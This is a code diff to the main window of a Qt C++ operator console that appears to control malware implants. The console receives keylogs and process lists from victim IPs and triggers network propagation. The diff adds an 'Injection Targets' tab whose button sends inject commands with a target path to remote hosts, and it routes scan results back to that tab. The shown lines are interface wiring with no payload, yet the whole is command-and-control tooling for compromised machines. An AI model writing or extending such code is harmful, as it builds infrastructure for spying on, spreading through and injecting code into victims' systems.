@@ -6,6 +6,7 @@
 #include "../../include/ui/components/AgentCardDialog.hpp"
 #include "../../include/ui/components/CommandDialog.hpp"
 #include "../../include/ui/components/PropagationPanel.hpp"
+#include "../../include/ui/components/InjectionPanel.hpp"
 #include "../../include/ui/StyleSheets.hpp"
 #include "../../include/database/Inferno_Database.hpp"
 #include "../../include/services/IntelAnalysisService.hpp"
@@ -36,6 +37,7 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     connect(m_server, &Server::processListReceived, this, &MainWindow::onProcessListReceived);
     connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
     connect(m_server, &Server::propagationResultReceived, this, &MainWindow::onPropagationResult);
+    connect(m_server, &Server::scanResultReceived, this, &MainWindow::onScanResult);
     connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);
 
     // Animation Init
@@ -89,6 +91,13 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
         m_propagationPanel->appendResult(ip, "DEPLOY requested on " + target);
     });
     connect(m_propagationPanel, &PropagationPanel::statusMessage, this, &MainWindow::onStatusMessage);
+
+    // Injection: bridge Inject button → server, and server result → panel
+    connect(m_injectionPanel, &InjectionPanel::injectRequested, this, [this](const QString& ip, const QString& targetPath) {
+        m_server->sendInjectCommand(ip, targetPath);
+        onStatusMessage(QString("Injection sent: %1 → %2").arg(ip, targetPath));
+    });
+    connect(m_server, &Server::injectResultReceived, m_injectionPanel, &InjectionPanel::onInjectResult);
 
     // Connect Business Logic Service for real-time notification updates
     connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
@@ -192,7 +201,11 @@ void MainWindow::setupUI() {
     m_intelligencePanel = new IntelligencePanel(this);
     m_tabWidget->addTab(m_intelligencePanel, "Intelligence Analysis");
 
-    // Tab 3: Network Propagation Panel
+    // Tab 3: Injection Targets Panel (Tier 2)
+    m_injectionPanel = new InjectionPanel(this);
+    m_tabWidget->addTab(m_injectionPanel, "Injection Targets");
+
+    // Tab 4: Network Propagation Panel
     m_propagationPanel = new PropagationPanel(this);
     m_tabWidget->addTab(m_propagationPanel, "Network Propagation");
 
@@ -342,6 +355,10 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
 
     // Delegate real-time buffer updating and extraction to the service layer
     IntelAnalysisService::instance().processKeylog(uuid, data);
+}
+
+void MainWindow::onScanResult(const QString& ip, const QString& report) {
+    m_injectionPanel->onScanResult(ip, report);
 }
 
 void MainWindow::onPropagationResult(const QString& ip, const QString& result) {
